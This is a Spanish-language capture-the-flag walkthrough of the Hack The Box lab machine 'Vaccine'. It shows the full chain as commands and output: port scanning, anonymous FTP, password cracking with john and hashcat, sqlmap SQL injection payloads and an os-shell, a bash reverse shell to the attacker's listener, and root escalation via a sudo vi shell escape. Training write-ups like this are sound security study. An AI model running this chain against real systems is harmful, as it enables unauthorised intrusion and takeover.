# Vaccine

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.4.71

PING 10.129.4.71 (10.129.4.71) 56(84) bytes of data.
64 bytes from 10.129.4.71: icmp_seq=1 ttl=63 time=172 ms

--- 10.129.4.71 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 172.366/172.366/172.366/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --min-rate 5000 -n -Pn -vvv 10.129.4.71 -oG openPorts

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 21,22,80 -sCV 10.129.4.71 -oN targeted

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.81
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 21     | ftp      | vsftpd 3.0.3                                                 |
| 22     | ssh      | OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0) |
| 80     | http     | Apache httpd 2.4.41 ((Ubuntu))                               |

🗹 Acceder al servidor por `ftp`  con el usuario `anonymous` y descargar el archivo `backup.zip`:

```shell
ftp ftp://anonymous:@10.129.4.71

Connected to 10.129.4.71.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> dir
229 Entering Extended Passive Mode (|||10826|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10409|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |******************************************************************************************************************************************|  2533       30.96 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (13.78 KiB/s)
```

🗹 Extraer el hash de la contraseña del archivo `backup.zip` con `zip2john` y guardarlo en un archivo:

```shell
zip2john backup.zip > hash

ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

🗹 Crackear el hash con `john`:

```shell
john -w=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2024-03-16 18:42) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

🗹 Ver el contenido del archivo `index.php`:

```shell
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

🗹 Crackear con `hashcat` el hash md5 perteneciente a la contraseña encontrada:

```shell
hashcat -m 0 '2cb42f8734ea607eefed3b70af13bbd3' /usr/share/wordlists/rockyou.txt
```

🗹 Ingresar el usuario `admin` en el campo `Username` y la contraseña `qwerty789` en el campo `Password` en la página de login.

🗹 Con `sqlmap` verificar si el parámetro `search` es vulnerable a inyecciones SQL:

```shell
sqlmap -u "http://10.129.96.0/dashboard.php?search=test" --cookie="PHPSESSID=kdrcpu58g24mc4cn5ffan6ncj5"

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:20:49 /2024-03-19/

[19:20:49] [INFO] testing connection to the target URL
[19:20:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:20:49] [INFO] testing if the target URL content is stable
[19:20:50] [INFO] target URL content is stable
[19:20:50] [INFO] testing if GET parameter 'search' is dynamic
[19:20:50] [WARNING] GET parameter 'search' does not appear to be dynamic
[19:20:50] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[19:20:50] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[19:20:50] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 

[19:21:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:21:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:21:37] [INFO] testing 'Generic inline queries'
[19:21:37] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:21:38] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[19:21:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:21:38] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[19:21:38] [INFO] testing 'PostgreSQL inline queries'
[19:21:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:21:39] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                                                
[19:21:42] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[19:21:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[19:21:53] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[19:21:54] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[19:21:55] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[19:21:55] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[19:21:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:22:00] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[19:22:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[19:22:11] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[19:22:16] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[19:22:17] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[19:22:20] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[19:22:22] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[19:22:23] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[19:22:23] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[19:22:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=test' AND (SELECT (CASE WHEN (1811=1811) THEN NULL ELSE CAST((CHR(70)||CHR(77)||CHR(71)||CHR(74)) AS NUMERIC) END)) IS NULL-- Juff

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=test' AND 9520=CAST((CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (9520=9520) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(113)||CHR(122)||CHR(113)) AS NUMERIC)-- xXWf
---
[19:22:34] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[19:22:37] [INFO] fetched data logged to text files under '/home/n0m3l4c000nt35/.local/share/sqlmap/output/10.129.96.0'

[*] ending @ 19:22:37 /2024-03-19/
```

🗹 Obtener una shell a través de `sqlmap`:

```shell
sqlmap -u "http://10.129.228.82/dashboard.php?search=test" --cookie="PHPSESSID=d7shv2ksji2q76p2oevbjn66ps" --os-shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:12:02 /2024-03-20/

[15:12:02] [INFO] testing connection to the target URL
[15:12:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:12:07] [INFO] testing if the target URL content is stable
[15:12:07] [INFO] target URL content is stable
[15:12:07] [INFO] testing if GET parameter 'search' is dynamic
[15:12:07] [WARNING] GET parameter 'search' does not appear to be dynamic
[15:12:07] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[15:12:07] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[15:12:07] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 

[15:12:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:12:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:12:14] [INFO] testing 'Generic inline queries'
[15:12:14] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[15:12:15] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[15:12:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:12:15] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[15:12:15] [INFO] testing 'PostgreSQL inline queries'
[15:12:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:12:16] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                                                
[15:12:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[15:12:30] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:12:41] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[15:12:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=test' AND (SELECT (CASE WHEN (7890=7890) THEN NULL ELSE CAST((CHR(119)||CHR(99)||CHR(122)||CHR(76)) AS NUMERIC) END)) IS NULL-- SLXz

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=test' AND 8943=CAST((CHR(113)||CHR(112)||CHR(118)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (8943=8943) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(112)||CHR(113)) AS NUMERIC)-- VqFG

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=test';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=test' AND 4912=(SELECT 4912 FROM PG_SLEEP(5))-- HLuW
---
[15:13:22] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[15:13:30] [INFO] fingerprinting the back-end DBMS operating system
[15:13:32] [INFO] the back-end DBMS operating system is Linux
[15:13:33] [INFO] testing if current user is DBA
[15:13:33] [INFO] retrieved: '1'
[15:13:34] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[15:13:34] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

🗹 Ponerse en escucha en la máquina atacante:

```shell
nc -lnvp 1234
```

🗹 Lanzar la reverse shell desde la shell obtenida con `sqlmap`:

```shell
os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.8/1234 0>&1"
do you want to retrieve the command standard output? [Y/n/a] 

[15:15:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
```

## User flag

🗹 La user flag se encuentra en el directorio `/var/lib/postgresql`:

```shell
cat /var/lib/postgresql/user.txt
```

🗹 Mirar el archivo `dashboard.php` que se encuentra en el directorio `/var/www/html` en el que se encuentran credenciales para acceeder a la base de datos:

```shell
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

🗹 Conectarse por `ssh` con las credenciales obtenidas:

```shell
ssh postgres@10.129.228.82
```

🗹 Listar los permisos de sudo que tiene el usuario actual:

```shell
postgres@vaccine:~$ sudo -l

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

🗹 Abrir el archivo pg_hba.conf como `sudo` con `vi`:

```shell
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

[GTFOBINS: vi -> sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)

🗹 Dentro de `vi` entrar en modo comandos presionando la tecla `esc` seguido de los dos puntos `:` y ejecutar:

```shell
!/bin/sh
```

## Root flag

🗹 La root flag se encuentra en el directorio `/root`:

```shell
cat /root/root.txt
```

## Cositas aprendidas

Directorio a tener en cuenta: `/etc/postgresql/11/main#`

Archivos de configuración de postgresql:
- `postgresql.conf`
- `pg_hba.conf`

Verificar los archivos a los que los usuarios tienen acceso con privilegios de `sudo` para evitar `shell escape`.
